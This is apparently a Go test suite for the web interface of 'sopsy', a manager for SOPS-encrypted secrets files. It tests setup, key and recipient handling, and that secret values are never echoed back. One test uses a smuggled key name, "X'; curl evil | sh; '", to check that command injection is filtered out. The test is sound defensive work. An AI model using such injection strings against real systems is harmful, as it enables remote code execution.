package web

import (
	"flag"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/niclasedge/sopsy/internal/keys"
	"github.com/niclasedge/sopsy/internal/testutil"
)

var update = flag.Bool("update", false, "rewrite golden files")

func TestSetupFreshMachine(t *testing.T) {
	u := newUI(t)
	u.login()
	r := u.get("/")
	wantStatus(t, r, http.StatusSeeOther)
	if loc := r.Header().Get("Location"); loc != "/setup" {
		t.Fatalf("fresh machine opens %q, want /setup", loc)
	}
	body := u.get("/setup").Body.String()
	for _, action := range []string{`action="/setup/key"`, `action="/setup/config"`, `action="/setup/file"`} {
		wantContains(t, body, action)
	}
	if n := strings.Count(body, "<li class=\"missing\">"); n != 3 {
		t.Errorf("%d missing steps, want 3", n)
	}
	if n := strings.Count(body, "CLI: <code>sopsy init</code>"); n != 3 {
		t.Errorf("%d steps show the CLI command, want 3", n)
	}

	for _, step := range []string{"key", "config", "file"} {
		page := u.follow("/setup/"+step, nil)
		wantContains(t, page, "created ")
	}
	body = u.get("/setup").Body.String()
	if strings.Contains(body, `class="missing"`) {
		t.Errorf("steps still missing after creating them:\n%s", body)
	}
	if loc := u.get("/").Header().Get("Location"); loc != "/keys" {
		t.Errorf("after setup / opens %q, want /keys", loc)
	}
}

func TestSetupAll(t *testing.T) {
	u := newUI(t)
	u.login()
	page := u.follow("/setup/all", nil)
	if n := strings.Count(page, "created "); n != 3 {
		t.Errorf("%d steps created, want 3:\n%s", n, page)
	}
	page = u.follow("/setup/all", nil)
	if n := strings.Count(page, "already present: "); n != 3 {
		t.Errorf("second run: %d steps present, want 3:\n%s", n, page)
	}
}

func TestSetupStepOutOfOrderExplains(t *testing.T) {
	u := newUI(t)
	u.login()
	page := u.follow("/setup/file", nil)
	wantContains(t, page, "no .sops.yaml", "sopsy init")
	if _, err := os.Stat(u.secrets()); err == nil {
		t.Error("secrets file created without .sops.yaml")
	}
	wantStatus(t, u.post("/setup/other", nil), http.StatusNotFound)
}

func TestKeysPageListsNamesOnly(t *testing.T) {
	u := newUI(t)
	u.useFixture()
	u.login()
	body := u.get("/keys").Body.String()
	wantContains(t, body, "API_TOKEN", "DB_PASSWORD", `type="password" name="value" autocomplete="off"`)
	if strings.Contains(body, `type="text" name="value"`) || strings.Contains(body, `name="value" value=`) {
		t.Error("a value field is not a password field or is prefilled")
	}
}

func TestSetValueNeverEchoed(t *testing.T) {
	u := newUI(t)
	u.useFixture()
	u.login()
	page := u.follow("/keys/set", url.Values{"name": {"NEW_KEY"}, "value": {"s3cr3t-test-value"}, "confirm": {"s3cr3t-test-value"}})
	wantContains(t, page, "added NEW_KEY", "<code>NEW_KEY</code>")
	page = u.follow("/keys/set", url.Values{"name": {"API_TOKEN"}, "value": {"second-s3cr3t-test-value"}, "confirm": {"second-s3cr3t-test-value"}})
	wantContains(t, page, "replaced API_TOKEN")
	got := u.entries()
	if got["NEW_KEY"] != "s3cr3t-test-value" || got["API_TOKEN"] != "second-s3cr3t-test-value" || got["DB_PASSWORD"] != testutil.FixtureValues["DB_PASSWORD"] {
		t.Fatal("file does not hold the submitted values")
	}
	testutil.SopsDecrypt(t, u.secrets(), testutil.KeyFile())
}

func TestSetRejectsBadInputUnchanged(t *testing.T) {
	u := newUI(t)
	u.useFixture()
	u.login()
	before := u.read(u.secrets())
	tests := []struct {
		name string
		form url.Values
		want string
	}{
		{"values differ", url.Values{"name": {"K"}, "value": {"s3cr3t-test-value"}, "confirm": {"second-s3cr3t-test-value"}}, "differ"},
		{"empty value", url.Values{"name": {"K"}, "value": {""}, "confirm": {""}}, "empty"},
		{"line break", url.Values{"name": {"K"}, "value": {"a\nb"}, "confirm": {"a\nb"}}, "line break"},
		// A value pasted into the name field must not be echoed back.
		{"value as name", url.Values{"name": {"s3cr3t-test-value"}, "value": {"x"}, "confirm": {"x"}}, "invalid key name"},
		{"reserved name", url.Values{"name": {"sops_mac"}, "value": {"x"}, "confirm": {"x"}}, "invalid key name"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			page := u.follow("/keys/set", tt.form)
			wantContains(t, page, tt.want, "nothing was written")
			if u.read(u.secrets()) != before {
				t.Fatal("secrets file changed")
			}
		})
	}
}

func TestDeleteNeedsConfirmation(t *testing.T) {
	u := newUI(t)
	u.useFixture()
	u.login()
	before := u.read(u.secrets())
	r := u.post("/keys/delete", url.Values{"name": {"API_TOKEN"}})
	wantStatus(t, r, http.StatusOK)
	wantContains(t, r.Body.String(), "Delete API_TOKEN?", `name="confirm" value="yes"`)
	if u.read(u.secrets()) != before {
		t.Fatal("file changed before confirmation")
	}
	page := u.follow("/keys/delete", url.Values{"name": {"API_TOKEN"}, "confirm": {"yes"}})
	wantContains(t, page, "deleted API_TOKEN")
	if _, ok := u.entries()["API_TOKEN"]; ok {
		t.Fatal("API_TOKEN still in the file")
	}
	page = u.follow("/keys/delete", url.Values{"name": {"API_TOKEN"}, "confirm": {"yes"}})
	wantContains(t, page, "not in the file; nothing changed")
}

func TestKeysPageWithoutFile(t *testing.T) {
	u := newUI(t)
	u.login()
	wantContains(t, u.get("/keys").Body.String(), "does not exist", "sopsy init")
}

func TestRecipientsPage(t *testing.T) {
	u := newUI(t)
	u.useFixture()
	u.login()
	body := u.get("/recipients").Body.String()
	wantContains(t, body, testutil.PublicKey, "this machine", `data-copy="own-key"`, `id="own-key"`)
}

func secondKey(t *testing.T) *keys.Key {
	t.Helper()
	k, err := keys.Generate(filepath.Join(t.TempDir(), "second.txt"))
	if err != nil {
		t.Fatal(err)
	}
	return k
}

func TestRecipientAddAndRemove(t *testing.T) {
	u := newUI(t)
	u.useFixture()
	u.login()
	second := secondKey(t)

	page := u.follow("/recipients/add", url.Values{"recipient": {second.Public}})
	wantContains(t, page, "added "+second.Public)
	wantContains(t, u.read(filepath.Join(u.dir, ".sops.yaml")), second.Public)
	testutil.SopsDecrypt(t, u.secrets(), second.Path)

	page = u.follow("/recipients/add", url.Values{"recipient": {second.Public}})
	wantContains(t, page, "already a recipient; nothing changed")

	before := u.read(u.secrets())
	r := u.post("/recipients/remove", url.Values{"recipient": {second.Public}})
	wantStatus(t, r, http.StatusOK)
	wantContains(t, r.Body.String(), "Remove this recipient?", "rotate every value")
	if u.read(u.secrets()) != before {
		t.Fatal("file changed before confirmation")
	}
	page = u.follow("/recipients/remove", url.Values{"recipient": {second.Public}, "confirm": {"yes"}})
	wantContains(t, page, "removed "+second.Public, "WARNING: rotate every value", "<li>API_TOKEN</li>", "<li>DB_PASSWORD</li>")
	if strings.Contains(u.read(u.secrets()), second.Public) {
		t.Fatal("removed key still in the file")
	}
}

func TestRecipientGuardsMirrorCLI(t *testing.T) {
	u := newUI(t)
	u.useFixture()
	u.login()
	file, config := u.read(u.secrets()), u.read(filepath.Join(u.dir, ".sops.yaml"))

	page := u.follow("/recipients/remove", url.Values{"recipient": {testutil.PublicKey}, "confirm": {"yes"}})
	wantContains(t, page, "last recipient", "nothing changed")
	page = u.follow("/recipients/add", url.Values{"recipient": {"age1notakey"}})
	wantContains(t, page, "not a valid age public key", "sopsy pubkey")
	page = u.follow("/recipients/remove", url.Values{"recipient": {secondKey(t).Public}, "confirm": {"yes"}})
	wantContains(t, page, "not a recipient; nothing changed")

	if u.read(u.secrets()) != file || u.read(filepath.Join(u.dir, ".sops.yaml")) != config {
		t.Fatal("files changed")
	}
}

func TestPastedPrivateKeyNotEchoed(t *testing.T) {
	u := newUI(t)
	u.useFixture()
	u.login()
	// The request helper fails the test if the value shows up anywhere.
	page := u.follow("/recipients/add", url.Values{"recipient": {"s3cr3t-test-value"}})
	wantContains(t, page, "not a valid age public key", "nothing changed")
	page = u.follow("/recipients/remove", url.Values{"recipient": {"s3cr3t-test-value"}})
	wantContains(t, page, "not a valid age public key")
}

func TestRetrieveSkipsUnsafeNames(t *testing.T) {
	ex := examples(exampleInput{File: "/srv/secrets.env", Names: []string{"X'; curl evil | sh; '", "GOOD_NAME"}})
	for _, e := range ex {
		for _, l := range e.Lines {
			if strings.Contains(l, "curl evil") {
				t.Fatalf("an unsafe key name reached a command: %s", l)
			}
		}
	}
	wantContains(t, ex[0].Lines[1], "$GOOD_NAME")
}

func TestRetrieveExamplesGolden(t *testing.T) {
	inputs := []exampleInput{
		{
			Dir:        "/srv/project",
			File:       "/srv/project/secrets.env",
			Executable: "/usr/local/bin/sopsy",
			KeyFile:    "/srv/home/.config/sops/age/keys.txt",
			Names:      []string{"API_TOKEN", "DB_PASSWORD"},
		},
		// Quotes and % must survive each shell's quoting and crontab.
		{Dir: "/srv/it's 100%", File: "/srv/it's 100%/secrets.env"},
	}
	var b strings.Builder
	for _, in := range inputs {
		for _, ex := range examples(in) {
			b.WriteString("## " + ex.Shell + "\n")
			for _, l := range ex.Lines {
				b.WriteString(l + "\n")
			}
			b.WriteString("# " + ex.Note + "\n")
		}
		b.WriteString("\n")
	}
	golden := filepath.Join("testdata", "retrieve.golden")
	if *update {
		if err := os.WriteFile(golden, []byte(b.String()), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	want, err := os.ReadFile(golden)
	if err != nil {
		t.Fatal(err)
	}
	if b.String() != string(want) {
		t.Fatalf("got:\n%s\nwant:\n%s", b.String(), want)
	}
}

func TestRetrievePage(t *testing.T) {
	u := newUI(t)
	u.useFixture()
	u.login()
	body := u.get("/retrieve").Body.String()
	wantContains(t, body, "bash / zsh", "PowerShell", "cmd", "cron", "$API_TOKEN", "/usr/local/bin/sopsy", u.secrets())
}
